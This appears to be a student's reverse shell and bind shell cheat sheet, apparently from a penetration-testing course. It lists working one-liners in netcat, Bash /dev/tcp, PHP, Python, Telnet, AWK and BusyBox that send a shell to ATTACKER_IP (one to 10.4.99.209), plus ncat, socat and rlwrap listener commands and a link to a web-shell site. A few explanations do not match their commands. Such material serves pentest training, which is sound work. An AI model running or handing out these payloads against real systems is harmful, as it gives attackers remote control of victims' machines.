### Links
-  Reverse shell cheat sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


### Reverse shell
### Gaining access explained:

All together:
``rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f``

- rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.

- mkfifo /tmp/f - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

- cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

- | bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.

- | nc ATTACKER_IP ATTACKER_PORT >/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).

- >/tmp/f -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.


### Bind shell

All together: 
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`


- rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.

- mkfifo /tmp/f - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

- cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

- | bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.

- | nc -l 0.0.0.0 8080 - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.

- >/tmp/f This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.



### Shell listeners


#### Rlwrap

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

Usage Example (Enhancing a Netcat Shell With Rlwrap)
Terminal

attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...

        

This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.

#### Ncat

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).

Usage Example (Listening for Reverse Shells)
Terminal

attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443

        


Usage Example (Listening for Reverse Shells with SSL)
Terminal

attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443

        

The --ssl option enables SSL encryption for the listener.


#### Socat

It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

Default Usage Example (Listening for Reverse Shell):
Terminal

attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443

        

The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands. The TCP-LISTEN:443 option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.



#### Bash

Normal Bash Reverse Shell
Terminal

target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 

        

This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.

Bash Read Line Reverse Shell
Terminal

target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 

        

This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

Bash With File Descriptor 196 Reverse Shell
Terminal

target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 

        

This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

Bash With File Descriptor 5 Reverse Shell
Terminal

target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5

        

Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.


#### PHP

PHP Reverse Shell Using the exec Function
Terminal

target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 

        

This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.

PHP Reverse Shell Using the shell_exec Function
Terminal

target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

        

Similar to the previous command, but uses the shell_exec function.

PHP Reverse Shell Using the system Function
Terminal

target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 

        

This reverse shell employs the system function, which executes the command and outputs the result to the browser.

PHP Reverse Shell Using the passthru Function
Terminal

target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'

        

The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.

PHP Reverse Shell Using the popen Function
Terminal

target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 

        

This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.

#### Python

Python Reverse Shell by Exporting Environment Variables
Terminal

target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 

        

This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

Python Reverse Shell Using the subprocess Module
Terminal

target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 

        

This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

Short Python Reverse Shell
Terminal

target@tryhackme:~$ python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

        

This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

Others

#### Telnet
Terminal

target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF

        

This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 

#### AWK
Terminal

target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

        

This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

#### BusyBox
Terminal

target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh

        

This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.



### web shells

Recourses: https://www.r57shell.net/index.php
